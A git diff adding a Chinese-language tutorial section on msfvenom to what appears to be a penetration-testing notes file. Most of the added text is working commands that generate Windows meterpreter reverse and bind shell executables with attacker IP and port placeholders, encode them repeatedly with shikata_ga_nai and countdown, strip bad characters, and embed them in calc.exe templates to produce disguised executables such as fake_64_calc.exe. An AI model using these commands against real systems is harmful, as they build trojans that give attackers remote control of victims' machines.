@@ -773,6 +773,120 @@ meterpreter > getuid
 Server username: root
 ```
 
+---
+
+Msfvenom是Metasploit框架中用于生成攻击载荷（payload）和编码（encoding）的工具。
+
+#### 生成 payload
+
+生成 payload 必须使用 `-p` 和 `-f` 两个参数：
+
+
+
+`-p`参数：指定要生成的payload类型
+
+查看所有可用 payload：
+
+```
+./msfvenom -l payloads
+```
+
+`-p` 也支持通过 `-` 读取自定义payload：
+
+```
+cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+```
+
+
+
+`-f` 参数：指定payload输出格式
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -f exe
+```
+
+
+
+典型使用案例：
+
+```
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[攻击者IP] LPORT=4444 -f exe -o /tmp/my_payload.exe
+```
+
+
+
+#### 编码Payload
+
+当使用`-b`（坏字符过滤）参数时，编码功能会自动启用。其他情况下需通过`-e`显式指定编码器：
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
+```
+
+
+
+查看可用编码器：
+
+```
+./msfvenom -l encoders
+```
+
+
+
+通过`-i`指定迭代次数（注意：编码并非真正的免杀解决方案）：
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+```
+
+
+
+#### 过滤坏字符
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
+```
+
+
+
+#### 自定义模板
+
+默认使用`msf/data/templates`目录的模板，可通过`-x`指定自定义模板：
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
+```
+
+
+
+注意：为64位Windows payload指定模板时需使用`exe-only`格式：
+
+```
+./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
+```
+
+
+
+`-k`参数可将payload作为新线程运行（仅适用于旧版x86 Windows如XP）：
+
+```
+./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe
+```
+
+
+
+#### 链式处理 Payload
+
+通过管道实现多重编码：
+
+```
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+```
+
+
+
 
 
 ## Nmap + msfconsole
